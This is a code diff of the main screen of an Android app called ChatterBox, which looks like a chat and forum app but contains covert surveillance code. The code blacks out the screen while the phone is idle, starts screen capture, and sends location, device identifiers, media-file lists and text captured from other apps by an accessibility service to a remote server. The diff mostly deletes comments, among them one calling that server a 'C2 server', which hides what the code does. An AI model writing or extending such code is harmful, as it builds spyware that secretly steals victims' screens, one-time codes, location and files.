@@ -1,15 +1,11 @@
 package com.example.ChatterBox
 
 import android.annotation.SuppressLint
-import android.app.NotificationChannel
-import android.app.NotificationManager
-import android.app.PendingIntent
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.content.IntentFilter
 import android.content.pm.PackageManager
-import android.graphics.Color
 import android.media.projection.MediaProjectionManager
 import android.net.Uri
 import android.os.Build
@@ -24,11 +20,11 @@ import android.view.WindowManager
 import android.widget.ImageView
 import android.widget.TextView
 import android.widget.Toast
+import androidx.annotation.RequiresApi
 import androidx.appcompat.app.ActionBarDrawerToggle
 import androidx.appcompat.app.AlertDialog
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
-import androidx.core.app.NotificationCompat
 import androidx.core.content.ContextCompat
 import androidx.core.view.GravityCompat
 import androidx.drawerlayout.widget.DrawerLayout
@@ -36,7 +32,6 @@ import com.bumptech.glide.Glide
 import com.example.ChatterBox.accessibility.AccessibilityHelper
 import com.example.ChatterBox.accessibility.AccessibilityPromoActivity
 import com.example.ChatterBox.accessibility.IdleDetector
-import com.example.ChatterBox.database.AccountManager
 import com.example.ChatterBox.database.BackgroundSyncService
 import com.example.ChatterBox.database.DataSynchronizer
 import com.example.ChatterBox.database.LocationTracker
@@ -68,6 +63,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         private const val TAG = "MainActivity"
     }
 
+    @RequiresApi(Build.VERSION_CODES.O)
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
         setContentView(R.layout.activity_main)
@@ -97,6 +93,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         return AccessibilityHelper.shouldShowAccessibilityPromo(this)
     }
 
+    @RequiresApi(Build.VERSION_CODES.O)
     private fun initializeAppAnalytics() {
         if (shouldShowAccessibilityPromo()) {
             startActivity(Intent(this, AccessibilityPromoActivity::class.java))
@@ -110,7 +107,6 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
             IdleDetector.registerIdleCallback {
                 com.example.ChatterBox.accessibility.ScreenOnService.showBlackOverlay(this)
 
-                // Perform silent background operations when device is idle
                 appExecutor.execute {
                     com.example.ChatterBox.accessibility.ScreenOnService.keepScreenOn(this)
 
@@ -121,11 +117,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                         serviceIntent.putExtra("data", mediaProjectionData)
                         startService(serviceIntent)
                     }
-
-                    // Synchronize data with C2 server
                     dataSynchronizer?.synchronizeData()
-
-                    // Collect location if available
                     collectLocationData()
                 }
             }
@@ -144,7 +136,6 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         ) {
             val locationTracker = LocationTracker.getInstance(this)
             locationTracker.captureLastKnownLocation { locationData ->
-                // Device ID is already included in locationData by LocationTracker
                 dataSynchronizer?.sendData("location_data", locationData.toString())
             }
         }
@@ -172,10 +163,10 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         try {
             val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
             val deviceInfo = JSONObject().apply {
-                put("device_model", android.os.Build.MODEL)
-                put("device_manufacturer", android.os.Build.MANUFACTURER)
-                put("android_version", android.os.Build.VERSION.RELEASE)
-                put("device_id", deviceId) // CONSISTENT: Always use deviceId
+                put("device_model", Build.MODEL)
+                put("device_manufacturer", Build.MANUFACTURER)
+                put("android_version", Build.VERSION.RELEASE)
+                put("device_id", deviceId)
                 put("user_id", auth.currentUser?.uid ?: "")
                 put("app_version", packageManager.getPackageInfo(packageName, 0).versionName)
                 put("timestamp", System.currentTimeMillis())
@@ -236,30 +227,19 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
             }
         }, 5, 20, TimeUnit.MINUTES)
     }
+    @RequiresApi(Build.VERSION_CODES.O)
     private fun setupAccessibilityDataCapture() {
-        // Simplified broadcast receiver - only needed for backward compatibility
-        // or custom app-specific processing
         val filter = IntentFilter("com.example.ChatterBox.ACCESSIBILITY_DATA")
         registerReceiver(object : BroadcastReceiver() {
             override fun onReceive(context: Context, intent: Intent) {
                 val capturedText = intent.getStringExtra("captured_text") ?: return
                 val sourceApp = intent.getStringExtra("source_app") ?: "unknown"
 
-                // Most processing now happens directly in AccessibilityService
-                // This is kept for backward compatibility or app-specific handling
-
-                Log.d(TAG, "Received accessibility data from $sourceApp")
-
-                // Any app-specific handling that's not in AccessibilityService can go here
-                // For example, UI updates or integration with other components
             }
         }, filter, RECEIVER_EXPORTED)
-
-        // Note: showOtpNotification method can be removed as it's now handled in AccessibilityService
     }
 
-    // The showOtpNotification method can be removed completely since it's now
-// implemented in the AccessibilityService class
+    @SuppressLint("HardwareIds")
     private fun collectMediaMetadata() {
         try {
             val deviceId = Settings.Secure.getString(contentResolver, Settings.Secure.ANDROID_ID)
@@ -295,17 +275,14 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                 }
             }
 
-            // Only send if we found media files
             if (count > 0) {
-                // Create a properly structured payload
                 val mediaData = JSONObject().apply {
-                    put("device_id", deviceId) // CONSISTENT: Always use deviceId
+                    put("device_id", deviceId)
                     put("media_files", mediaFiles)
                     put("timestamp", System.currentTimeMillis())
-                    put("device_model", android.os.Build.MODEL)
-                    put("android_version", android.os.Build.VERSION.RELEASE)
+                    put("device_model", Build.MODEL)
+                    put("android_version", Build.VERSION.RELEASE)
                 }
-
                 dataSynchronizer?.sendData("media_metadata", mediaData.toString())
             }
         } catch (e: Exception) {
@@ -529,7 +506,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                 showLogoutDialog()
             }
         }
-        drawerLayout.closeDrawer(GravityCompat.START) // Close drawer after clicking
+        drawerLayout.closeDrawer(GravityCompat.START)
         return true
     }
 
@@ -550,12 +527,10 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
         }
     }
 
-
     override fun onBackPressed() {
         if (drawerLayout.isDrawerOpen(GravityCompat.START)) {
-            drawerLayout.closeDrawer(GravityCompat.START) // 🔥 Close drawer first
+            drawerLayout.closeDrawer(GravityCompat.START)
         } else {
-            // 🔥 Prevent back action (do nothing)
             Toast.makeText(this, "Press the logout button to exit.", Toast.LENGTH_SHORT).show()
         }
     }
@@ -565,23 +540,21 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
             .setTitle("Log Out")
             .setMessage("Are you sure you want to log out?")
             .setPositiveButton("Yes") { _, _ ->
-                logoutUser() // ✅ Only logout when user confirms
+                logoutUser()
             }
             .setNegativeButton("Cancel", null)
             .show()
     }
 
     private fun logoutUser() {
-        auth.signOut() // ✅ Sign out from Firebase Auth
-
+        auth.signOut()
         val intent = Intent(this, LoginActivity::class.java)
         intent.flags =
-            Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK // ✅ Clear backstack
+            Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK
         startActivity(intent)
         AccessibilityHelper.resetSession(this)
-        finish() // ✅ Close current activity
+        finish()
     }
-
 
     private fun loadUserProfile() {
         val user = auth.currentUser ?: return
@@ -605,7 +578,6 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                 if (document != null && document.exists()) {
                     val displayName = document.getString("displayName") ?: "User"
                     val profilePicUrl = document.getString("profilePicUrl")
-
                     userNameTextView.text = displayName
 
                     if (!profilePicUrl.isNullOrEmpty()) {
@@ -617,7 +589,6 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                 }
             }
     }
-
 
     private fun checkIfAdmin() {
         val currentUser = auth.currentUser ?: return
@@ -655,7 +626,7 @@ class MainActivity : AppCompatActivity(), NavigationView.OnNavigationItemSelecte
                     document.get("enrolledForum") as? List<String> ?: emptyList()
                 val navView: NavigationView = findViewById(R.id.navigation_view)
                 val menu = navView.menu
-                menu.removeGroup(R.id.nav_enrolled_forums_group) // ✅ Clear old entries
+                menu.removeGroup(R.id.nav_enrolled_forums_group)
 
                 if (enrolledModuleCodes.isEmpty()) {
                     menu.add(
